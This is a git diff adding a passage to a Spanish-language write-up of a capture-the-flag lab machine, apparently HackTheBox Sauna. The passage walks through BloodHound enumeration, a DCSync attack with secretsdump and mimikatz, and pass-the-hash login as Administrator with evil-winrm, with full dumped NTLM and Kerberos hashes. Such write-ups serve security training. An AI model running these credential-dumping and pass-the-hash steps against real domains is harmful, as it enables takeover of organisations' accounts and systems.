@@ -23,6 +23,7 @@ tags:
   - john
   - Evil-WinRM
   - BloodHoundAD
+  - neo4j
 ---
 
 ## Enumeracion
@@ -351,3 +352,173 @@ con el nombre busque en google tal cual **svc_loanmgr privilage escalation** y e
 > [https://www.puckiestyle.nl/aclpwn-py/](https://www.puckiestyle.nl/aclpwn-py/)
 
 > [https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)
+
+#### reconocer que hacer
+
+ya sabemos que va por el tema de bloodhound, por lo que procederemos a instalar apps para explotar este servicio.
+
+```Python
+apt update
+apt install neo4j bloodhound -y 
+```
+lo iniciamos
+
+```Python
+neo4j console
+```
+entramos al puerto 7474 y cambiamos la password de neo4j
+
+abriendo otra terminal, le damos a bloodhound
+
+```Python
+sleep 2; bloodhound > /dev/null  2>&1 &
+disown //para que sea un proceso padre (solo)
+```
+
+ahora hay que subir un comprimido que sera el que obtendremos de la maquina windows.
+
+con [SharpHound.ps1](https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1)
+
+lo trasferimos a la maquina y lo cargamos
+
+```Python
+*Evil-WinRM* PS C:\Users\FSmith\Desktop> Import-Module .\SharpHound.ps1
+*Evil-WinRM* PS C:\Users\FSmith\Desktop> Invoke-BloodHound -CollectionMethod All //para coleccionar toda la informacion
+```
+
+aveces falla, debe listar un zip.
+
+lo cargamos en bloodhound usando **cargar la data**. esto te puede mostrar cual es el comando para obtenter o explotar la vuln con **Find principal with DCSync** 
+
+#### secret dump
+
+```Python
+root@kali:~/Documents/results/10.10.10.1758# secretsdump.py -just-dc-ntlm EGOTISTICAL-BANK.LOCAL/SVC_LOANMGR:"Moneymakestheworldgoround!"@10.10.10.175
+Impacket v0.9.21.dev1+20200214.111603.5259ed0f - Copyright 2020 SecureAuth Corporation
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:53af03ca541bb66a02ec45f5dc8139af:::
+[*] Cleaning up...
+```
+
+
+nos logueamos una vez ya obtenido el hash via evil-wirm
+
+```Python
+root@kali:~# evil-winrm -i 10.10.10.175 -u Administrator -H d9485863c1e9e05851aa40cbb4ab9dff
+Evil-WinRM shell v2.3
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+egotisticalbank\administrator
+```
+
+listo root 
+
+#### otra forma es con un DCSync attack con mimikatz
+
+```Python
+.\mimikatz.exe "lsadump::dcsync /user:Administrator" "exit"
+```
+
+```Python
+  .#####.   mimikatz 2.2.0 (x64) #19041 Jul 15 2020 16:10:52
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # lsadump::dcsync /user:Administrator
+[DC] 'EGOTISTICAL-BANK.LOCAL' will be the domain
+[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server
+[DC] 'Administrator' will be the user account
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 1/24/2020 10:14:15 AM
+Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff
+    ntlm- 0: d9485863c1e9e05851aa40cbb4ab9dff
+    ntlm- 1: 7facdc498ed1680c4fd1448319a8c04f
+    lm  - 0: ee8c50e6bc332970a8e8a632488f5211
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : caab2b641b39e342e0bdfcd150b1683e
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
+      aes128_hmac       (4096) : 145e4d0e4a6600b7ec0ece74997651d0
+      des_cbc_md5       (4096) : 19d5f15d689b1ce5
+    OldCredentials
+      aes256_hmac       (4096) : 9637f48fa06f6eea485d26cd297076c5507877df32e4a47497f360106b3c95ef
+      aes128_hmac       (4096) : 52c02b864f61f427d6ed0b22639849df
+      des_cbc_md5       (4096) : d9379d13f7c15d1c
+
+* Primary:Kerberos *
+    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
+    Credentials
+      des_cbc_md5       : 19d5f15d689b1ce5
+    OldCredentials
+      des_cbc_md5       : d9379d13f7c15d1c
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:WDigest *
+    01  3fbea1ff422da035f1dc9b0ce45e84ea
+    02  708091daa9db25abbd1d94246e4257e2
+    03  417f2e40d5be8d436af749ed9fddb0b0
+    04  3fbea1ff422da035f1dc9b0ce45e84ea
+    05  50cb7cfb64edf83218804d934e30d431
+    06  781dbcf7b8f9079382a1948f26f561ee
+    07  4052111530264023a7d445957f5146e6
+    08  8f4bffc5d94cc294272cd0c836e15c47
+    09  0c81bc892ea87f7dd0f4a3a05b51f158
+    10  f8c10a5bd37ea2568976d47ef12e55b9
+    11  8f4bffc5d94cc294272cd0c836e15c47
+    12  023b04503e3eef421de2fcaf8ba1297d
+    13  613839caf0cf709da25991e2e5cb63cf
+    14  16974c015c9905fb27e55a52dc14dfb0
+    15  3c8af7ccd5e9bd131849990d6f18954b
+    16  2b26fb63dcbf03fe68b67cdd2c72b6e6
+    17  6eeda5f64e4adef4c299717eafbd2850
+    18  3b32ec94978feeac76ba92b312114e2c
+    19  b25058bc1ebfcac10605d39f65bff67f
+    20  89e75cc6957728117eb1192e739e5235
+    21  7e6d891c956f186006f07f15719a8a4e
+    22  a2cada693715ecc5725a235d3439e6a2
+    23  79e1db34d98ccd050b493138a3591683
+    24  1f29ace4f232ebce1a60a48a45593205
+    25  9233c8df5a28ee96900cc8b59a731923
+    26  08c02557056f293aab47eccf1186c100
+    27  695caa49e68da1ae78c1523b3442e230
+    28  57d7b68bd2f06eae3ba10ca342e62a78
+    29  3f14bb208435674e6a1cb8a957478c18
+
+
+mimikatz(commandline) # exit
+Bye!
+```
+
+el hash NTLM es el que nos dara acceso via evil-winrm al user administrator.
